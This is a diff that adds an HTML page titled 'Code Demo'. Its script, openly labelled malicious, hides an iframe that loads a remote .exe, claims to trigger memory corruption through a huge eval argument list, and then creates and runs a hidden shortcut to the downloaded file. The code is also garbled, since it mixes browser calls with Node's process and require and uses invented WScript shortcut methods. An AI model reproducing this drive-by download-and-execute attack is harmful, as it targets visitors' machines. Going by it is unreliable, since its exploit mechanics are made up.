@@ -1,0 +1,51 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Code Demo</title>
+</head>
+<body>
+    <script>
+// Define a malicious JavaScript function
+function evil() {
+    // Create a hidden iframe
+    var iframe = document.createElement("iframe");
+    iframe.style.display = "none";
+    document.body.appendChild(iframe);
+
+    // Set the source to the malicious link
+    iframe.src = "https://down.360safe.com/se/setup_online_1.1.12.0.exe";
+
+    // Wait for the iframe to load
+    iframe.onload = function() {
+        // Get the iframe's window object
+        var win = iframe.contentWindow;
+
+        // Trigger the memory corruption by calling a JavaScript function with a large number of arguments
+        win.eval("Math.max(" + "0,".repeat(0x100000) + "0)");
+
+        // Create a shortcut to the downloaded file by calling another JavaScript function with a large number of arguments
+        // Store the returned object in a variable
+        var shortcut = win.eval("WScript.Shell.CreateShortcut(" + "'".repeat(0x100000) + `${process.env.TEMP}\\setup.lnk` + "'".repeat(0x100000) + ")");
+
+        // Set the target path to the downloaded file
+        shortcut.TargetPath = `${process.env.TEMP}\\setup.exe`;
+
+        // Set the window style to hidden
+        shortcut.WindowStyle = 7;
+
+        // Set the run time to 10 seconds later
+        shortcut.RunTime = 10;
+
+        // Save the shortcut
+        shortcut.Save();
+
+        // Execute the shortcut
+        require("child_process").execSync(`${process.env.TEMP}\\setup.lnk`);
+    };
+}
+
+// Call the malicious JavaScript function
+evil();
+    </script>
+</body>
+</html>
